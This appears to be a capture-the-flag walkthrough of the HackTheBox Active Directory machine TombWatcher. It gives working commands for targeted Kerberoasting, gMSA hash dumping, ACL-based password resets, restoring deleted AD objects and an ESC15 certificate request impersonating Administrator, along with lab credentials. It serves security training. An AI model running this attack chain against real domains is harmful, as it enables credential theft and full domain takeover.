Summary
#

TombWatcher is a medium-difficulty Active Directory machine that focuses heavily on privilege escalation through delegated permissions and object control abuse. Starting from a low-privileged domain user, the attack chain leverages WriteSPN permissions to perform targeted Kerberoasting and recover additional credentials. Subsequent access to privileged groups enables the extraction of a gMSA password, which is used to compromise multiple domain accounts through ACL abuse. After obtaining interactive access via WinRM, further enumeration reveals control over an organizational unit and the ability to restore deleted Active Directory objects. The machine concludes with the exploitation of a vulnerable AD CS certificate template through ESC15, allowing the issuance of a certificate for the Administrator account and resulting in full domain compromise.

From the output, we identified that the DNS name of the machine is “DC01.tombwatcher.htb” and the Active Directory Domain is “tombwatcher.htb”. We can write the following DNS entry in our /etc/hosts file:

<TARGET_IP> DC01.tombwatcher.htb DC01 tombwatcher.htb

To sync the system time with that of the DC, use ntpdate:

└─$ sudo ntpdate <TARGET_IP>

Initial Access
#

Active Directory Enumeration
#

We will start with enumerating the SMB shares accessible to us using the netexec tool:

└─$ sudo nxc smb <TARGET_IP> -u henry -p 'H3nry_987TGV!' --shares
 
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share

These are standard Domain Controller SMB shares and there are no custom share available. We can spider the shares automatically and see if we have any interesting files hidden:

└─$ sudo nxc smb <TARGET_IP> -u henry -p 'H3nry_987TGV!' -M spider_plus

Reviewing the output did not reveal anything useful. Therefore, we will use the BloodHound Python collector to gather Active Directory data and identify potential attack paths:

└─$ bloodhound-ce-python -c all -u 'henry' -p 'H3nry_987TGV!' -d 'tombwatcher.htb' -ns <TARGET_IP> --dns-tcp --zip --dns-timeout 90

Open the Bloodhound GUI with:

└─$ bloodhound-start

Starting from the Henry user node, since we have valid credentials for this account. We analyzed that it has WriteSPN property over the user Alfred

As Kerberoasting attacks target Service Accounts set with ServicePrincipalNames to find their clear-text password by cracking the acquired TGS tickets, we can use this property to write or remove SPNs from the target user. Since this user currently has no SPNs configured, we can add one ourselves. We can use the suggested methods provided by bloodhound by clicking WriteSPN > Linux Abuse

The tool says that to perform the kerberoasting attack, we can use the python script targetedKerberoast.py as:

└─$ python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --dc-ip <TARGET_IP> --request-user alfred

Save the hash in a file and crack with hashcat mode 13100:

└─$ hashcat -m 13100 Alfred-TGS.hash /usr/share/wordlists/rockyou.txt

The password for the Alfred account is successfully recovered.

Looking at the outbound object control privileges of Alfred we see that it can add itself to the AD group Infrastructure

Looking at the outbound object control of the group shows it can read the gMSA (Group Managed Service Account) password for the computer account Ansible_Dev$

Then looking at the privileges of the computer account revealed that it can change the account password for user Sam

Looking at Sam’s priviliges we can write the owner attribute of the user John

Then John has GenericAll over the Organizational Unit (OU) ADCS

The attack path can be summarized as:

Henry → Alfred → Infrastructure → Ansible_Dev$ → Sam → John → ADCS OU

Exploiting the BloodHound Attack Path
#

We can start with adding Alfred to the Infrastructure group with bloodyad:

└─$ bloodyad -u alfred -p '<Alfred-Password>' -d tombwatcher.htb -i <TARGET_IP> add groupMember Infrastructure Alfred

[+] Alfred added to Infrastructure

To dump the gMSA password of Ansible_Dev$:

└─$ sudo netexec ldap <TARGET_IP> -u alfred -p '<Alfred-Password>' --gmsa

We will get the NTLM hash in output. Using the hash, we can now change the password of user Sam:

└─$ bloodyad -u 'ansible_dev$' -p ':<NTHash>' -d tombwatcher.htb -i <TARGET_IP> set password sam 'Sam@12345'

[+] Password changed successfully!

To change the ownership of user John from existing owner to Sam:

└─$ bloodyad -u sam -p 'Sam@12345' -d tombwatcher.htb -i <TARGET_IP> set owner john sam

[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john

NOTE: After some time the owner attribute of John is reset so make sure to rewrite the owner if further attacks don’t work

To confirm the ownership of the user, we can use impacket-owneredit:

└─$ impacket-owneredit tombwatcher.htb/sam:'Sam@12345' -dc-ip <TARGET_IP> -target john -action read

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-1105
[*] - sAMAccountName: sam
[*] - distinguishedName: CN=sam,CN=Users,DC=tombwatcher,DC=htb

Now as we have the ownership, we can grant ourselves full control of the user by adding the GenericAll privileges:

└─$ bloodyad -u sam -p 'Sam@12345' -d tombwatcher.htb -i <TARGET_IP> add genericAll john sam

[+] sam has now GenericAll on john

Just like we changed the password of Sam, we can now use Sam to change the password of John:

└─$ bloodyad -u sam -p 'Sam@12345' -d tombwatcher.htb -i <TARGET_IP> set password john 'John@12345'

[+] Password changed successfully!

Checking the group membership of “Remote Management Users” in bloodhound, we only find John as a member of the Remote Management Users group, which grants him WinRM access to the host.

To login to WinRM:

└─$ evil-winrm -i <TARGET_IP> -u 'john' -p 'John@12345'

We can find the user.txt in Desktop folder of user John:

*Evil-WinRM* PS C:\Users\john\Documents> cat ..\Desktop\user.txt

Escalating Privileges
#

After gaining access as John, we have GenericAll rights over the OU ADCS. Checking the objects that come under this OU, we found only one GPO (Group Policy Object). Having the GenericAll rights, we can apply ACEs (Access Control Entries) that will be inherited down to the objects in the OU. All object will inherit the ACEs except those marked with ACL Inheritance Disabled as true. Checking the info of the GPO revealed that it’s not going to inherit the ACEs we apply to the OU

So we have to find some other way to reach the Administrator account.

Abusing the Deleted Objects Container
#

Rechecking the write privileges of our user john with bloodyad as bloodhound doesn’t show all the Active Directory configurations:

└─$ bloodyad -u john -p 'John@12345' -d tombwatcher.htb -i <TARGET_IP> get writable --right WRITE --otype ou

distinguishedName: CN=Deleted Objects,DC=tombwatcher,DC=htb
permission: WRITE

distinguishedName: OU=ADCS,DC=tombwatcher,DC=htb
permission: WRITE

From here, we saw an OU “Deleted Objects” which acts like a Recycle Bin for Active Directory. It contains objects that are deleted from the Active Directory. As we have permissions over the OU, we can list the objects and find interesting ones that may help us in privilege escalation.

└─$ bloodyad -u john -p 'John@12345' -d tombwatcher.htb -i <TARGET_IP> get children --target 'CN=Deleted Objects,DC=tombwatcher,DC=htb'

distinguishedName: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb

└─$ bloodyad -u john -p 'John@12345' -d tombwatcher.htb -i <TARGET_IP> set restore S-1-5-21-1392491010-1358638721-2126982587-1111

From the output, the object is restored under OU ADCS. If we apply the ACE to the OU, it will also be applied to the cert_admin user:

└─$ impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'John@12345'

└─$ bloodyad -u john -p 'John@12345' -d tombwatcher.htb -i <TARGET_IP> set password cert_admin "CertAdmin@12345"

The Remarks at the end tells that it is vulnerable to ESC15 but exploitation depends upon whether the mentioned patch is applied or not.

Searching for techniques related to ESC15, we found the documentation created by the developer of the certipy tool Oliver Lyak. ESC15 is defined as:

ESC15 (also tracked as CVE-2024-49019 or referred to as EKUwu) is an Active Directory Certificate Services (AD CS) privilege escalation vulnerability. It exploits a logic flaw in Schema Version 1 templates. It allows attackers to inject unauthorized Extended Key Usages (EKUs) during certificate enrollment to authenticate as highly privileged accounts (e.g., Domain Admins).

Since cert_admin has enrollment rights on the vulnerable WebServer template, we can request a certificate containing arbitrary application policies. By injecting the Client Authentication EKU and requesting a certificate for the Administrator account, we can obtain credentials that allow authentication as Domain Administrator.

└─$ certipy req -ca tombwatcher-CA-1 -template WebServer -upn Administrator@tombwatcher.htb -sid S-1-5-21-1392491010-1358638721-2126982587-500 -application-policies 'Client Authentication' -u 'cert_admin@tombwatcher.htb' -p 'CertAdmin@12345' -dc-ip <TARGET_IP>
